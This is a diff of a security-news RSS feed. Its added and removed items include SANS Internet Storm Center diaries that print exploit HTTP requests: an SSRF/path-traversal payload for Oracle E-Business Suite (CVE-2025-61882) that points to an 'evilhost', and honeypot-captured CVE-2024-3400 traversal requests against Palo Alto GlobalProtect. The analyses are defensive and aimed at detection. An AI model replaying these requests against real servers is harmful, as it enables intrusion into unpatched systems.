@@ -1,5 +1,95 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Mon, 06 Oct 2025 02:59:18 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Monday, October 6th, 2025 https://isc.sans.edu/podcastdetail/9642</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>ISC Stormcast For Monday, October 6th, 2025 https://isc.sans.edu/podcastdetail/9642, (Mon, Oct 6th)</title><link>https://isc.sans.edu/diary/rss/32344</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32344</guid></item><item><title>Apple and Google Pull ICE-Tracking Apps, Bowing to DOJ Pressure</title><link>https://www.wired.com/story/apple-and-google-pull-ice-tracking-apps-bowing-to-doj-pressure/</link><description>Plus: China sentences scam bosses to death, Europe is ramping up its plans to build a “drone wall” to protect against Russian airspace violations, and more.</description><guid isPermaLink="false">68e0069b0657e0c2fe68a56a</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / National Security</category><category>Security / Privacy</category><category>Security / Security News</category><category>security roundup</category><category>privacy</category><category>security</category><category>cybersecurity</category><category>apple</category><category>Google</category><category>scams</category><category>Russia</category><category>China</category><category>Security Roundup</category></item><item><title>Yale Study: ChatGPT Hasn’t Upended the US Job Market…Yet</title><link>https://www.techrepublic.com/article/news-ai-job-market-impact-yale-study/</link><description>&lt;p&gt;Despite ongoing fears, researchers say job disruption from generative AI has yet to appear in employment data. &lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Mon, 06 Oct 2025 03:59:17 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Quick and Dirty Analysis of Possible Oracle E-Business Suite Exploit Script (CVE-2025-61882)</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Quick and Dirty Analysis of Possible Oracle E-Business Suite Exploit Script (CVE-2025-61882), (Mon, Oct 6th)</title><link>https://isc.sans.edu/diary/rss/32346</link><description>&lt;p&gt;This weekend, Oracle published a surprise security bulletin announcing an exploited vulnerability in Oracle E-Business Suite. As part of the announcement, which also included a patch, Oracle published IoC observed as part of the incident response &amp;#x5b;1&amp;#x5d;.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;This weekend, Oracle published a surprise security bulletin announcing an exploited vulnerability in Oracle E-Business Suite. As part of the announcement, which also included a patch, Oracle published IoC observed as part of the incident response [1].&lt;/p&gt;
+
+&lt;p&gt;One script I found interesting is what Oracle calls &amp;quot;exp.py&amp;quot;. Here is a quick analysis of the HTTP requests sent by the script. I only ran it against a simple Python web server, not an actual Oracle E-Business Suite install.&lt;/p&gt;
+
+&lt;p&gt;The script takes two parameters: The URL of the target and the IP/port of a config server.&lt;/p&gt;
+
+&lt;p&gt;The first request sent by the script:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;tt&gt;GET /OA_HTML/runforms.jsp HTTP/HTTP/1.1&lt;br /&gt;
+Host: [target host]:8000&lt;br /&gt;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36&lt;br /&gt;
+Accept-Encoding: gzip, deflate&lt;br /&gt;
+Accept: */*&lt;br /&gt;
+Connection: keep-alive&lt;/tt&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The script starts by assuming that the internal host is the same as the target host. If this request results in a redirect, the new internal host will be extracted from the Location header.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;tt&gt;POST /OA_HTML/JavaScriptServlet HTTP/HTTP/1.1&lt;br /&gt;
+Host: [target host]:8000&lt;br /&gt;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36&lt;br /&gt;
+Accept-Encoding: gzip, deflate&lt;br /&gt;
+Accept: */*&lt;br /&gt;
+Connection: keep-alive&lt;br /&gt;
+CSRF-XHR: YES&lt;br /&gt;
+FETCH-CSRF-TOKEN: 1&lt;br /&gt;
+Content-Length: 0&lt;/tt&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This request will return a CSRF token that is extracted from the body of the response.&lt;/p&gt;
+
+&lt;p&gt;Finally, the actual exploit request is created:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;tt&gt;POST /OA_HTML/configurator/UiServlet HTTP/HTTP/1.1&lt;br /&gt;
+Host: localhost:8000&lt;br /&gt;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36&lt;br /&gt;
+Accept-Encoding: gzip, deflate&lt;br /&gt;
+Accept: */*&lt;br /&gt;
+Connection: keep-alive&lt;br /&gt;
+CSRF-XHR: YES&lt;br /&gt;
+FETCH-CSRF-TOKEN: 1&lt;br /&gt;
+Content-Length: 4324&lt;br /&gt;
+Content-Type: application/x-www-form-urlencoded&lt;/tt&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;These are the headers of the request, which are not very remarkable. The body is a bit more interesting. After URL and HTML entity decoding, the body turns out to be:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;tt&gt;redirectFromJsp=1&lt;br /&gt;
+getUiType=&amp;lt;?xml+version=&amp;quot;1.0&amp;quot;+encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;br /&gt;
+&amp;lt;initialize&amp;gt;&lt;br /&gt;
+++++&amp;lt;param+name=&amp;quot;init_was_saved&amp;quot;&amp;gt;test&amp;lt;/param&amp;gt;&lt;br /&gt;
+++++&amp;lt;param+name=&amp;quot;return_url&amp;quot;&amp;gt;&lt;br /&gt;
+http://target:7201/OA_HTML/help/../ieshostedsurvey.jsp HTTP/1.2&lt;br /&gt;
+Host: evilhost:80&lt;br /&gt;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36&lt;br /&gt;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;br /&gt;
+Connection: keep-alive&lt;br /&gt;
+Cookie:&lt;/tt&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;tt&gt;POST /&lt;/tt&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;tt&gt;++++&amp;lt;param+name=&amp;quot;ui_def_id&amp;quot;&amp;gt;0&amp;lt;/param&amp;gt;&lt;br /&gt;
+++++&amp;lt;param+name=&amp;quot;config_effective_usage_id&amp;quot;&amp;gt;0&amp;lt;/param&amp;gt;&lt;br /&gt;
+++++&amp;lt;param+name=&amp;quot;ui_type&amp;quot;&amp;gt;Applet&amp;lt;/param&amp;gt;&lt;br /&gt;
+&amp;lt;/initialize&amp;gt;&lt;/tt&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Interesting is the use of the invalid HTTP version 1.2, which may be used to bypass some filters. The stray &amp;quot;POST /&amp;quot; at the end is labeled as &amp;quot;keep alive&amp;quot;, and may just be a partial request to keep the connection open a bit longer.&lt;/p&gt;
+
+&lt;p&gt;Port 7201 is the default non-TLS port for the application server. The URL looks like a path traversal exploit. Given that this is the payload of the last request, the vulnerability is likely best described as a server-side request forgery issue (and it is labeled as such in the script).&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;In short, the exploit does:&lt;/p&gt;
+
+&lt;ul&gt;
+	&lt;li&gt;Verify the hostname name&lt;/li&gt;
+	&lt;li&gt;Retrieve a CSRF token&lt;/li&gt;
+	&lt;li&gt;sends a request to the app server to use SSRF to connect to an &amp;quot;evilhost&amp;quot; and retrieve instructions? Maybe more about this later. From a detection point of view. The HTTP version 1.2 looks promising.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;[1]&amp;nbsp;https://www.oracle.com/security-alerts/alert-cve-2025-61882.html&lt;/p&gt;
+
+&lt;p&gt;--&lt;br /&gt;
+Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;SANS.edu&lt;/a&gt;&lt;br /&gt;
+&lt;a href="https://jbu.me/164"&gt;Twitter&lt;/a&gt;|&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32346</guid></item><item><title>ISC Stormcast For Monday, October 6th, 2025 https://isc.sans.edu/podcastdetail/9642, (Mon, Oct 6th)</title><link>https://isc.sans.edu/diary/rss/32344</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32344</guid></item><item><title>Apple and Google Pull ICE-Tracking Apps, Bowing to DOJ Pressure</title><link>https://www.wired.com/story/apple-and-google-pull-ice-tracking-apps-bowing-to-doj-pressure/</link><description>Plus: China sentences scam bosses to death, Europe is ramping up its plans to build a “drone wall” to protect against Russian airspace violations, and more.</description><guid isPermaLink="false">68e0069b0657e0c2fe68a56a</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / National Security</category><category>Security / Privacy</category><category>Security / Security News</category><category>security roundup</category><category>privacy</category><category>security</category><category>cybersecurity</category><category>apple</category><category>Google</category><category>scams</category><category>Russia</category><category>China</category><category>Security Roundup</category></item><item><title>Yale Study: ChatGPT Hasn’t Upended the US Job Market…Yet</title><link>https://www.techrepublic.com/article/news-ai-job-market-impact-yale-study/</link><description>&lt;p&gt;Despite ongoing fears, researchers say job disruption from generative AI has yet to appear in employment data. &lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-ai-job-market-impact-yale-study/"&gt;Yale Study: ChatGPT Hasn’t Upended the US Job Market…Yet&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4329856</guid><category>Artificial Intelligence</category><category>CXO</category><category>News</category><category>Tech &amp; Work</category></item><item><title>A biological 0-day? Threat-screening tools may miss AI-designed proteins.</title><link>https://arstechnica.com/science/2025/10/do-ai-designed-proteins-create-a-biosecurity-vulnerability/</link><description>Ordering DNA for AI-designed toxins doesn't always raise red flags.</description><content:encoded>&lt;p&gt;On Thursday, a team of researchers led by Microsoft announced that they had discovered, and possibly patched, what they're terming a biological zero-day—an unrecognized security hole in a system that protects us from biological threats. The system at risk screens purchases of DNA sequences to determine when someone's ordering DNA that encodes a toxin or dangerous virus. But, the researchers argue, it has become increasingly vulnerable to missing a new threat: AI-designed toxins.&lt;/p&gt;
 &lt;p&gt;How big of a threat is this? To understand, you have to know a bit more about both existing biosurveillance programs and the capabilities of AI-designed proteins.&lt;/p&gt;
 &lt;h2&gt;Catching the bad ones&lt;/h2&gt;
@@ -2465,47 +2555,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 &lt;a href="https://jbu.me/164"&gt;Twitter&lt;/a&gt;|&lt;/p&gt;
 
  
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32330</guid></item><item><title>Increase in Scans for Palo Alto Global Protect Vulnerability (CVE-2024-3400), (Mon, Sep 29th)</title><link>https://isc.sans.edu/diary/rss/32328</link><description>&lt;p&gt;We are all aware of the abysmal state of security appliances, no matter their price tag. Ever so often, we see an increase in attacks against some of these vulnerabilities, trying to mop up systems missed in earlier exploit waves. Currently, on source in particular, &amp;#x25;&amp;#x25;ip:141.98.82.26&amp;#x25;&amp;#x25; is looking to exploit systems vulnerable to CVE-2024-3400. The exploit is rather straightforward. Palo Alto never considered it necessary to validate the session id. Instead, they use the session ID "as is" to create a session file. The exploit is well explained by watchTowr &amp;#x5b;1&amp;#x5d;.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;We are all aware of the abysmal state of security appliances, no matter their price tag. Ever so often, we see an increase in attacks against some of these vulnerabilities, trying to mop up systems missed in earlier exploit waves. Currently, on source in particular, %%ip:141.98.82.26%% is looking to exploit systems vulnerable to CVE-2024-3400. The exploit is rather straightforward. Palo Alto never considered it necessary to validate the session id. Instead, they use the session ID &amp;quot;as is&amp;quot; to create a session file. The exploit is well explained by watchTowr [1].&lt;/p&gt;
-
-&lt;p&gt;First, we see a request to upload a file:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;pre&gt;
-POST /ssl-vpn/hipreport.esp
-Host: [honeypot ip]:8080
-User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
-Connection: close
-Content-Length: 174
-Content-Type: application/x-www-form-urlencoded
-Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/33EGKkp7zRbFyf06zCV4mzq1vDK.txt;
-Accept-Encoding: gzip
-
-user=global&amp;amp;portal=global&amp;amp;authcookie=e51140e4-4ee3-4ced-9373-96160d68&amp;amp;domain=global&amp;amp;computer=global&amp;amp;client-ip=global&amp;amp;client-ipv6=global&amp;amp;md5-sum=global&amp;amp;gwHipReportCheck=global&lt;/pre&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Next, a request to retrieve the uploaded file:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;pre&gt;
-GET /global-protect/portal/images/33KFpJLBHsMmkNuxs7pqpGOIIgF.txt
-host: [honeypot ip]
-user-agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
-connection: close
-accept-encoding: gzip&lt;/pre&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;This will return a &amp;quot;403&amp;quot; error if the file exists, and a &amp;quot;404&amp;quot; error if the upload failed. It will not execute code. The content of the file is a standard Global Protect session file, and will not execute. A follow-up attack would upload the file to a location that leads to code execution.&amp;nbsp;&lt;/p&gt;
-
-&lt;p&gt;The same source is also hitting the URL &amp;quot;/Synchronization&amp;quot; on our honeypots. Google AI associates this with a Global Protect vulnerability discovered last week, but this appears to be a hallucination.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
-
-&lt;p&gt;[1]&amp;nbsp;https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/&lt;/p&gt;
-
-&lt;p&gt;--&lt;br /&gt;
-Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;SANS.edu&lt;/a&gt;&lt;br /&gt;
-&lt;a href="https://jbu.me/164"&gt;Twitter&lt;/a&gt;|&lt;/p&gt;
-
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32328</guid></item><item><title>Trump Weighs Tariffs to Force 1:1 US Chip Output</title><link>https://www.techrepublic.com/article/news-trump-chip-tariffs-one-to-one-balance-foreign-reliance/</link><description>&lt;p&gt;White House weighs tariffs tied to a 1:1 balance between US-made and imported chips, aiming to cut foreign reliance and test Trump’s truce with tech.&lt;/p&gt;
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32330</guid></item><item><title>Trump Weighs Tariffs to Force 1:1 US Chip Output</title><link>https://www.techrepublic.com/article/news-trump-chip-tariffs-one-to-one-balance-foreign-reliance/</link><description>&lt;p&gt;White House weighs tariffs tied to a 1:1 balance between US-made and imported chips, aiming to cut foreign reliance and test Trump’s truce with tech.&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-trump-chip-tariffs-one-to-one-balance-foreign-reliance/"&gt;Trump Weighs Tariffs to Force 1:1 US Chip Output&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4329278</guid><category>APAC</category><category>Apple</category><category>Artificial Intelligence</category><category>Google</category><category>Hardware</category><category>International</category><category>News</category></item><item><title>Details of a Scam</title><link>https://www.schneier.com/blog/archives/2025/09/details-of-a-scam.html</link><description>&lt;p&gt;Longtime Crypto-Gram readers know that I collect &lt;a href="https://www.schneier.com/blog/archives/2024/02/details-of-a-phone-scam.html"&gt;personal experiences&lt;/a&gt; of people being scammed. Here&amp;#8217;s an &lt;a href="https://www.nytimes.com/2025/09/18/nyregion/zelle-chase-banking-scam.html?unlocked_article_code=1.nE8.mifp.13j7oh96HfpC&amp;#038;smid=url-share&amp;#038;utm_source=substack&amp;#038;utm_medium=email"&gt;almost&lt;/a&gt;:&lt;/p&gt;
 &lt;blockquote&gt;&lt;p&gt;Then he added, &amp;#8220;Here at Chase, we&amp;#8217;ll never ask for your personal information or passwords.&amp;#8221; On the contrary, he gave me more information&amp;#8212;two &amp;#8220;cancellation codes&amp;#8221; and a long case number with four letters and 10 digits.&lt;/p&gt;
 &lt;p&gt;That&amp;#8217;s when he offered to transfer me to his supervisor. That simple phrase, familiar from countless customer-service calls, draped a cloak of corporate competence over this unfolding drama. His &lt;i&gt;supervisor&lt;/i&gt;. I mean, would a scammer have a supervisor?...&lt;/p&gt;&lt;/blockquote&gt;</description><content:encoded>&lt;p&gt;Longtime Crypto-Gram readers know that I collect &lt;a href="https://www.schneier.com/blog/archives/2024/02/details-of-a-phone-scam.html"&gt;personal experiences&lt;/a&gt; of people being scammed. Here&amp;#8217;s an &lt;a href="https://www.nytimes.com/2025/09/18/nyregion/zelle-chase-banking-scam.html?unlocked_article_code=1.nE8.mifp.13j7oh96HfpC&amp;#038;smid=url-share&amp;#038;utm_source=substack&amp;#038;utm_medium=email"&gt;almost&lt;/a&gt;:&lt;/p&gt;
